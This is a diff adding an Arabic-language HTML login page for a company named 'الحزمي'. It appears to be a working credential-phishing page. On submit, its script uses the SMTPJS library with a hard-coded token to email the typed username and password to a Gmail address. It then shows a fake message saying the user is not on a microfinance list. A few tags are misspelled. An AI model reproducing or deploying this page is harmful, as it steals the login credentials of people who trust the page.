@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>شركة الحزمي </title>
+  
+ <link
+      rel="stylesheet"
+      href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
+      crossorigin="anonymous"
+    />
+
+    <link
+      rel="stylesheet"
+      href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"
+      integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p"
+      crossorigin="anonymous"
+    />
+
+  <link rel="stylesheet" href="style.css">
+  
+  <scri6pt src="https://smtpjs.com/v3/smtp.js"> </script>
+</head>
+
+<body dir="rtl">
+  
+ <im6g style="width: 100% ; margin-block: 0px ; border-radius: 30px 30px 0px 0px" src="zf.jpg" alt="azz.jpg">
+   <br>
+   <br>
+   <br>
+   <br>
+   
+
+ <div class="ra">
+   
+ 
+
+  <div class="q" onsubmit="sendEmail(); reset(); return false">
+    <br>
+  <h6 style="color: slategray ; float: right ; padding: 5px ; margin-block: 0px ;  margin-right: 60px ; font-family: 'cairo'">أسم المستخدم</h6>
+    
+    
+  <form onsubmit="sendEmail(); reset(); return false">
+
+ <input style="border: 1.1px solid midnightblue" type="text" id="name" placeholder=" أدخل أسم المستخدم   " required >
+ <br>
+<br>
+<h6 style="color: slategray ; float: right ; padding: 5px ; margin-block: 0px ;  margin-right: 60px ; font-family: 'cairo'">كلمة المرور</h6>
+ 
+<input style="border: 1.1px solid midnightblue" type="password" id="password" name="password" placeholder="ادخل كلمة المرور">
+<br>
+
+    <br>
+    <button style="font-family: cairo ;padding-left: 15%;
+    padding-right: 15%;padding-top: 5px;padding-block: 5px; border-radius: 30px; background: white; border: 1px solid midnightblue">تسجيل الدخول</button>
+    <br>
+    <br>
+  </form>
+  </div>
+ </div>
+<script src="https://smtpjs.com/v3/smtp.js"> </script>
+  <script>
+    
+function sendEmail() {
+Email.send({
+SecureToken : "e3275d41-401a-4c76-9c84-b900cd9d7440",
+      To:'waaat2491@gmail.com',
+      From:"waaat2491@gmail.com",
+      Subject:"test 5",
+Body:"name: " + document.getElementById("name").value
+
+      + "<br> password: " + document.getElementById("password").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+
+    }).then(
+      message => alert("عذراً انت لست في قائمة التمويل الاصغر")
+    );
+    }
+  </script>
+</body>
+</html>
